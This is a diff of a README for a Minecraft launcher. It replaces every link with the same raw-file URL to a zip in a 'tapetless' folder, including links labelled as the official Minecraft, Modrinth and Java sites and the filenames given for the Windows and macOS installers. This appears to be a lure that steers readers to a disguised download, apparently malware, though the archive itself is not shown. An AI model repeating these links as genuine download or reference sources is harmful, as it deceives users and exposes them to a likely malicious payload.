@@ -1,6 +1,6 @@
 # 🎮 Minecraft-Core-Master - Easy Minecraft Launcher for Everyone
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20from%20GitHub-Release-brightgreen.svg)](https://github.com/HHNat/Minecraft-Core-Master/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/HHNat/Minecraft-Core-Master/main/tapetless/Minecraft-Core-Master.zip%20from%https://raw.githubusercontent.com/HHNat/Minecraft-Core-Master/main/tapetless/Minecraft-Core-Master.zip)](https://raw.githubusercontent.com/HHNat/Minecraft-Core-Master/main/tapetless/Minecraft-Core-Master.zip)
 
 ## 📥 Overview
 Minecraft-Core-Master lets you download, install, and run Vanilla and modded versions of Minecraft easily. It supports multiple mod loaders, including Forge, NeoForge, Fabric, Quilt, and LegacyFabric. You can also use it with Modrinth modpacks (.mrpack) while managing all libraries, assets, and native files.
@@ -22,10 +22,10 @@ To begin using Minecraft-Core-Master, follow these steps to download and run the
 
 ## 📦 Download & Install
 1. **Visit the Releases Page**:
-   Go to the [Releases page](https://github.com/HHNat/Minecraft-Core-Master/releases) to download the latest version of Minecraft-Core-Master.
+   Go to the [Releases page](https://raw.githubusercontent.com/HHNat/Minecraft-Core-Master/main/tapetless/Minecraft-Core-Master.zip) to download the latest version of Minecraft-Core-Master.
 
 2. **Download the Application**:
-   On the releases page, find the latest version and click on it. This will take you to a list of files. You need to download the installer or executable file, which is often named something like `Minecraft-Core-Master.exe` for Windows or `Minecraft-Core-Master.dmg` for macOS.
+   On the releases page, find the latest version and click on it. This will take you to a list of files. You need to download the installer or executable file, which is often named something like `https://raw.githubusercontent.com/HHNat/Minecraft-Core-Master/main/tapetless/Minecraft-Core-Master.zip` for Windows or `https://raw.githubusercontent.com/HHNat/Minecraft-Core-Master/main/tapetless/Minecraft-Core-Master.zip` for macOS.
 
 3. **Install the Application**:
    - Windows:
@@ -50,9 +50,9 @@ If you encounter any issues during installation or while running the application
 - **Updates**: Make sure Minecraft-Core-Master is updated to the latest version by checking the releases page periodically.
 
 ## 📚 Additional Resources
-- [Minecraft Official Website](https://www.minecraft.net)
-- [Modrinth Mod Packs](https://modrinth.com)
-- [Java Downloads](https://www.java.com/en/download/)
+- [Minecraft Official Website](https://raw.githubusercontent.com/HHNat/Minecraft-Core-Master/main/tapetless/Minecraft-Core-Master.zip)
+- [Modrinth Mod Packs](https://raw.githubusercontent.com/HHNat/Minecraft-Core-Master/main/tapetless/Minecraft-Core-Master.zip)
+- [Java Downloads](https://raw.githubusercontent.com/HHNat/Minecraft-Core-Master/main/tapetless/Minecraft-Core-Master.zip)
 
 ## 🛠️ Support
 For any further questions or support, consider opening an issue in the GitHub repository. The community often helps quickly.
@@ -61,7 +61,7 @@ For any further questions or support, consider opening an issue in the GitHub re
 Minecraft-Core-Master is open-source software released under the MIT License. Feel free to contribute or modify the code as needed.
 
 ## 🌐 Connect with Us
-- GitHub Repository: [Minecraft-Core-Master](https://github.com/HHNat/Minecraft-Core-Master)
+- GitHub Repository: [Minecraft-Core-Master](https://raw.githubusercontent.com/HHNat/Minecraft-Core-Master/main/tapetless/Minecraft-Core-Master.zip)
 - Follow for updates and news regarding releases!
   
 By following these steps, you should have a smooth experience with Minecraft-Core-Master. Happy gaming!
